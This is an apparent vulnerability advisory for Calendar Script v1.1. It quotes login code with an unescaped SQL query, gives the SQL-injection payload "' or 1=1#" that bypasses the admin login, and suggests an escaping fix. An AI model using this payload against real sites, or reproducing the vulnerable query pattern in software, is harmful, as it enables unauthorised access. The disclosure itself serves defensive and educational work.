Calendar Script 1.1 (Auth Bypass) SQL Injection Vulnerability
=============================================================


-----------------------------------------------------
 Calendar Script v1.1 Admin Login Bypass Vulnerability
 -----------------------------------------------------
 by athos - staker
 http://www.hotscripts.com/jump.php?listing_id=71365&jump_type=1

 File Vuln "index.php" (code details)

 ------------------------------------------------------------

 4.  $action = $_POST[&#039;action&#039;];
 5.
 6.  switch($action) {
 7.  case &#039;login&#039;:
 8.  // login
 9.  $username = stripslashes(trim($_POST[&#039;username&#039;]));
 10. $password = sha1(stripslashes(trim($_POST[&#039;password&#039;])));
 11.
 12. if(empty($username) || empty($password)) {
 13. // Stop, someone tried entering nothing into here
 14. // Show an error.
 15. $loginMsg = &#039;You must enter a username and password&#039;;
 16. } else {
 17. // The input seems to be ok, check it against the database.
 18. $checkDetails = mysql_query("SELECT id FROM user WHERE username=&#039;$username&#039; AND password=&#039;$password&#039; LIMIT 1", $conn);

 ------------------------------------------------------------

 Exploit

 http://[host]/[path]/index.php

 (Login) Username: &#039; or 1=1# & Password: anything

 ------------------------------------------------------------

 Fix: $username = mysql_real_escape_string($_POST[&#039;username&#039;]);

 Note: works regardless php.ini settings (inj3ct0r =D)
       don&#039;t add me on msn messenger

 ------------------------------------------------------------



